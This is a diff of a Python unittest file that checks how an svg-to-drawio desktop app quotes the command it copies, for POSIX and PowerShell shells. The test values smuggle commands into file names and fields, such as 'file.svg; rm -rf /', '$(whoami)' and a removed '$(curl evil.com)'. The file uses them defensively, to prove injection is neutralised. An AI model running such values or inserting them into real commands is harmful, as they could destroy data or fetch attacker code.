@@ -2,10 +2,18 @@
 
 from __future__ import annotations
 
+import shlex
 import unittest
+from unittest.mock import patch
 
 from svg_to_drawio.rendering_options import RenderingOptions
-from svg_to_drawio_desktop.cli_command import CliCommandOptions, build_equivalent_cli_command, quote_cli_arg
+from svg_to_drawio_desktop.cli_command import (
+    CliCommandOptions,
+    build_cli_argv,
+    build_equivalent_cli_command,
+    quote_powershell_arg,
+    render_powershell_command,
+)
 
 
 def _base_options(**overrides: object) -> CliCommandOptions:
@@ -26,115 +34,161 @@ def _base_options(**overrides: object) -> CliCommandOptions:
     return CliCommandOptions(**defaults)  # type: ignore[arg-type]
 
 
-class CliCommandMergeTests(unittest.TestCase):
-    """The copied command must reflect the merge/post-process fields when they are set."""
-
-    def test_no_merge_or_post_process_omits_the_new_flags(self) -> None:
-        command = build_equivalent_cli_command(_base_options())
-        for flag in ("--merge", "--merge-output", "--grid-columns", "--legend", "--background-color"):
-            self.assertNotIn(flag, command)
+class CliArgvTests(unittest.TestCase):
+    """Build shell-independent arguments without changing option behavior."""
 
     def test_merge_pages_includes_mode_and_output(self) -> None:
-        command = build_equivalent_cli_command(_base_options(merge="pages", merge_output="out/merged.drawio"))
-        self.assertIn("--merge pages", command)
-        self.assertIn("--merge-output 'out/merged.drawio'", command)
-        self.assertNotIn("--grid-columns", command)
-
-    def test_merge_grid_includes_columns_when_set(self) -> None:
-        command = build_equivalent_cli_command(
-            _base_options(merge="grid", merge_output="out/merged.drawio", grid_columns=3)
+        argv = build_cli_argv(_base_options(merge="pages", merge_output="out/merged.drawio"))
+        self.assertEqual(
+            argv,
+            ["svg-to-drawio", "diagram.svg", "--merge", "pages", "--merge-output", "out/merged.drawio"],
         )
-        self.assertIn("--merge grid", command)
-        self.assertIn("--grid-columns 3", command)
 
-    def test_legend_and_background_are_appended(self) -> None:
-        command = build_equivalent_cli_command(_base_options(legend=True, background_color="#FFFFFF"))
-        self.assertIn("--legend", command)
-        self.assertIn("--background-color '#FFFFFF'", command)
-
-
-class CliCommandSecurityTests(unittest.TestCase):
-    """The copied command must properly escape shell metacharacters to prevent command injection."""
-
-    def test_command_substitution_with_dollar_parens_is_escaped(self) -> None:
-        """Verify that $(command) syntax is properly escaped and won't execute."""
-        malicious_path = "$(touch /tmp/marker)"
-        quoted = quote_cli_arg(malicious_path)
-        # shlex.quote should escape this so it's treated as a literal string
-        self.assertNotIn("$(touch", quoted)  # The $() should be escaped/quoted
-        # Verify it's safe by checking the command doesn't contain unquoted command substitution
-        command = build_equivalent_cli_command(_base_options(sources=(malicious_path,)))
-        # The command should contain the escaped version, not raw $(touch /tmp/marker)
-        self.assertIn("'$(touch /tmp/marker)'", command)
-
-    def test_backtick_command_substitution_is_escaped(self) -> None:
-        """Verify that backtick command substitution is properly escaped."""
-        malicious_path = "`touch /tmp/marker`"
-        quoted = quote_cli_arg(malicious_path)
-        # Should be safely quoted
-        self.assertIn("'`touch /tmp/marker`'", quoted)
-        
-    def test_variable_expansion_is_escaped(self) -> None:
-        """Verify that $VAR variable expansion is properly escaped."""
-        malicious_path = "$HOME/evil"
-        quoted = quote_cli_arg(malicious_path)
-        # Should be safely quoted to prevent expansion
-        self.assertIn("'$HOME/evil'", quoted)
-
-    def test_backslash_escapes_are_neutralized(self) -> None:
-        """Verify that backslash escape sequences are treated literally."""
-        path_with_backslash = "path\\nwith\\tescapes"
-        quoted = quote_cli_arg(path_with_backslash)
-        # Should preserve backslashes literally
-        self.assertIn(path_with_backslash, quoted)
-
-    def test_semicolon_command_chaining_is_escaped(self) -> None:
-        """Verify that semicolon command chaining is properly escaped."""
-        malicious_path = "file.svg; rm -rf /"
-        quoted = quote_cli_arg(malicious_path)
-        # Should be safely quoted
-        self.assertIn("';'", quoted)
-
-    def test_pipe_command_is_escaped(self) -> None:
-        """Verify that pipe operators are properly escaped."""
-        malicious_path = "file.svg | cat"
-        quoted = quote_cli_arg(malicious_path)
-        # Should be safely quoted
-        self.assertIn("'|'", quoted)
-
-    def test_output_dir_with_command_substitution_is_escaped(self) -> None:
-        """Verify that malicious output_dir is properly escaped."""
-        malicious_dir = "$(whoami)"
-        command = build_equivalent_cli_command(_base_options(output_dir=malicious_dir))
-        # Should contain safely quoted version
-        self.assertIn("'$(whoami)'", command)
-
-    def test_merge_output_with_command_substitution_is_escaped(self) -> None:
-        """Verify that malicious merge_output is properly escaped."""
-        malicious_output = "$(id).drawio"
-        command = build_equivalent_cli_command(
-            _base_options(merge="pages", merge_output=malicious_output)
+    def test_all_existing_option_groups_are_preserved(self) -> None:
+        options = _base_options(
+            sources=("one.svg", "two.svg"),
+            output_dir="out dir",
+            recursive=True,
+            overwrite=True,
+            flatten=True,
+            watch=False,
+            use_cache=False,
+            max_elements=42,
+            workers=3,
+            merge="grid",
+            merge_output="merged.drawio",
+            grid_columns=2,
+            legend=True,
+            background_color="#FFFFFF",
+            preset="fidelity",
         )
-        # Should contain safely quoted version
-        self.assertIn("'$(id).drawio'", command)
+        self.assertEqual(
+            build_cli_argv(options),
+            [
+                "svg-to-drawio",
+                "one.svg",
+                "two.svg",
+                "--output-dir",
+                "out dir",
+                "--recursive",
+                "--overwrite",
+                "--flatten",
+                "--no-cache",
+                "--max-elements",
+                "42",
+                "--workers",
+                "3",
+                "--merge",
+                "grid",
+                "--merge-output",
+                "merged.drawio",
+                "--grid-columns",
+                "2",
+                "--legend",
+                "--background-color",
+                "#FFFFFF",
+                "--rendering-preset",
+                "fidelity",
+            ],
+        )
 
-    def test_background_color_with_command_substitution_is_escaped(self) -> None:
-        """Verify that malicious background_color is properly escaped."""
-        malicious_color = "$(curl evil.com)"
-        command = build_equivalent_cli_command(_base_options(background_color=malicious_color))
-        # Should contain safely quoted version
-        self.assertIn("'$(curl evil.com)'", command)
+    def test_watch_still_omits_workers(self) -> None:
+        argv = build_cli_argv(_base_options(watch=True, workers=4))
+        self.assertIn("--watch", argv)
+        self.assertNotIn("--workers", argv)
 
-    def test_simple_paths_remain_readable(self) -> None:
-        """Verify that simple paths without special characters remain readable."""
-        simple_path = "diagram.svg"
-        quoted = quote_cli_arg(simple_path)
-        # Simple paths should remain unquoted or minimally quoted
-        self.assertIn("diagram.svg", quoted)
 
-    def test_paths_with_spaces_are_properly_quoted(self) -> None:
-        """Verify that paths with spaces are properly quoted."""
-        path_with_spaces = "my diagram.svg"
-        quoted = quote_cli_arg(path_with_spaces)
-        # Should be quoted to handle spaces
-        self.assertIn("'my diagram.svg'", quoted)
+class PosixCommandTests(unittest.TestCase):
+    """POSIX commands must round-trip every untrusted value as one literal argument."""
+
+    def test_special_source_values_round_trip_with_shlex(self) -> None:
+        values = (
+            "$(touch /tmp/marker)",
+            "`touch /tmp/marker`",
+            "$HOME/evil",
+            "file.svg; rm -rf /",
+            "file.svg | cat",
+            "file.svg && whoami",
+            "file.svg > /tmp/output",
+            "path with spaces.svg",
+            "path'with'apostrophes.svg",
+            'path"with"quotes.svg',
+            r"path\with\backslashes.svg",
+        )
+        for value in values:
+            with self.subTest(value=value):
+                command = build_equivalent_cli_command(_base_options(sources=(value,)), shell="posix")
+                self.assertEqual(shlex.split(command), ["svg-to-drawio", value])
+
+    def test_all_user_controlled_fields_round_trip(self) -> None:
+        options = _base_options(
+            sources=("source $(whoami); ' file.svg",),
+            output_dir="output | $(id)",
+            merge="pages",
+            merge_output="merged; ' $(id).drawio",
+            background_color="color | ' $(id)",
+        )
+        self.assertEqual(shlex.split(build_equivalent_cli_command(options, shell="posix")), build_cli_argv(options))
+
+    def test_normal_command_does_not_require_artificial_quotes(self) -> None:
+        options = _base_options(merge="pages", merge_output="out/merged.drawio")
+        command = build_equivalent_cli_command(options, shell="posix")
+        self.assertEqual(shlex.split(command), build_cli_argv(options))
+        self.assertEqual(command, "svg-to-drawio diagram.svg --merge pages --merge-output out/merged.drawio")
+
+
+class PowerShellCommandTests(unittest.TestCase):
+    """PowerShell rendering must use literal single-quoted arguments."""
+
+    def test_quote_powershell_arg_preserves_literal_values(self) -> None:
+        cases = {
+            "": "''",
+            "hello": "'hello'",
+            "my diagram.svg": "'my diagram.svg'",
+            "$(whoami)": "'$(whoami)'",
+            "$HOME": "'$HOME'",
+            "`whoami`": "'`whoami`'",
+            "a;b": "'a;b'",
+            "a|b": "'a|b'",
+            "a&b": "'a&b'",
+            "Virgile's file.svg": "'Virgile''s file.svg'",
+            'path"with"quotes.svg': "'path\"with\"quotes.svg'",
+            r"path\with\backslashes.svg": r"'path\with\backslashes.svg'",
+        }
+        for value, expected in cases.items():
+            with self.subTest(value=value):
+                self.assertEqual(quote_powershell_arg(value), expected)
+
+    def test_windows_paths_are_preserved_and_single_quoted(self) -> None:
+        paths = (
+            r"C:\Users\Virgile\diagram.svg",
+            r"C:\Users\Virgile\My Diagram.svg",
+            r"C:\Users\O'Brien\diagram.svg",
+            r"C:\Temp\$(whoami)\diagram.svg",
+        )
+        for windows_path in paths:
+            with self.subTest(path=windows_path):
+                rendered = render_powershell_command(["svg-to-drawio", windows_path])
+                self.assertEqual(rendered, f"svg-to-drawio {quote_powershell_arg(windows_path)}")
+
+    def test_every_argument_after_program_is_quoted(self) -> None:
+        options = _base_options(
+            sources=("source $(whoami); ' file.svg",),
+            output_dir="output | $(id)",
+            merge="pages",
+            merge_output="merged; ' $(id).drawio",
+            background_color="color & ' $(id)",
+        )
+        argv = build_cli_argv(options)
+        expected = " ".join([argv[0], *(quote_powershell_arg(arg) for arg in argv[1:])])
+        self.assertEqual(build_equivalent_cli_command(options, shell="powershell"), expected)
+
+    def test_windows_platform_defaults_to_powershell(self) -> None:
+        options = _base_options(sources=("$(whoami)",))
+        with patch("svg_to_drawio_desktop.cli_command.os.name", "nt"):
+            command = build_equivalent_cli_command(options)
+        self.assertEqual(command, "svg-to-drawio '$(whoami)'")
+
+
+if __name__ == "__main__":
+    unittest.main()
